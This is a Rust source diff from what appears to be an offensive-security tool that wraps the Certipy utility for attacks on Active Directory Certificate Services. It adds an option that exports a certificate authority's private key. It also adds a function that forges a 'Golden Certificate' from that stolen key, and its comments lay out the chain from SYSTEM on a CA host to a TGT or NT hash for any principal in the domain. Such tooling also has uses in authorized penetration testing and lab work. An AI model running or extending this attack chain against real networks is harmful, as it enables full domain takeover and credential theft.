@@ -163,10 +163,15 @@ pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
-/// Certipy CA management operations (add-officer, issue-request).
+/// Certipy CA management operations (add-officer, issue-request, backup).
 ///
 /// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`
-/// Required: one of `add_officer` (bool) or `issue_request` (integer request ID)
+/// Required: exactly one of:
+///   - `add_officer` (bool, true)
+///   - `issue_request` (integer request ID)
+///   - `backup` (bool, true) — exports the CA private key to `<ca>.pfx` in CWD.
+///     Requires SYSTEM-equivalent access on the CA host (e.g., the calling
+///     process is running on a host where `username` is local administrator).
 pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
@@ -177,6 +182,7 @@ pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
     let user_at_domain = format!("{username}@{domain}");
 
     let add_officer = optional_bool(args, "add_officer").unwrap_or(false);
+    let backup = optional_bool(args, "backup").unwrap_or(false);
     let issue_request = args
         .get("issue_request")
         .and_then(|v| v.as_i64())
@@ -188,7 +194,7 @@ pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
         .flag("-password", password)
         .flag("-dc-ip", dc_ip)
         .flag("-ca", ca)
-        .timeout_secs(120);
+        .timeout_secs(180);
 
     if add_officer {
         cmd = cmd.flag("-add-officer", format!("{username}@{domain}"));
@@ -196,8 +202,50 @@ pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
     if let Some(req_id) = issue_request {
         cmd = cmd.flag("-issue-request", req_id.to_string());
     }
+    if backup {
+        cmd = cmd.arg("-backup");
+    }
 
     cmd.execute().await
+}
+
+/// Forge a "Golden Certificate" from a stolen CA PFX (the `-backup` output of
+/// `certipy_ca`). Produces a client PFX that authenticates as `upn` on the CA's
+/// domain — the universal terminal node for ADCS compromise: any path that
+/// gets SYSTEM on a CA host can chain `certipy_ca backup` → this tool →
+/// `certipy_auth` to obtain a TGT/NT hash for any principal in the domain.
+///
+/// Required args: `ca_pfx` (path to stolen CA PFX), `upn` (target principal,
+///                e.g. `administrator@essos.local`)
+/// Optional args: `subject`, `template`, `out` (output PFX path)
+pub async fn certipy_forge(args: &Value) -> Result<ToolOutput> {
+    let ca_pfx = required_str(args, "ca_pfx")?;
+    let upn = required_str(args, "upn")?;
+    let subject = optional_str(args, "subject");
+    let template = optional_str(args, "template");
+
+    let out = match optional_str(args, "out") {
+        Some(o) => o.to_string(),
+        None => {
+            let ts = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_millis())
+                .unwrap_or(0);
+            let safe_upn = upn.replace(['/', '\\', ' '], "_");
+            format!("forged_{safe_upn}_{ts}.pfx")
+        }
+    };
+
+    CommandBuilder::new("certipy")
+        .arg("forge")
+        .flag("-ca-pfx", ca_pfx)
+        .flag("-upn", upn)
+        .flag_opt("-subject", subject)
+        .flag_opt("-template", template)
+        .flag("-out", out)
+        .timeout_secs(60)
+        .execute()
+        .await
 }
 
 /// Retrieve a previously issued certificate by request ID.
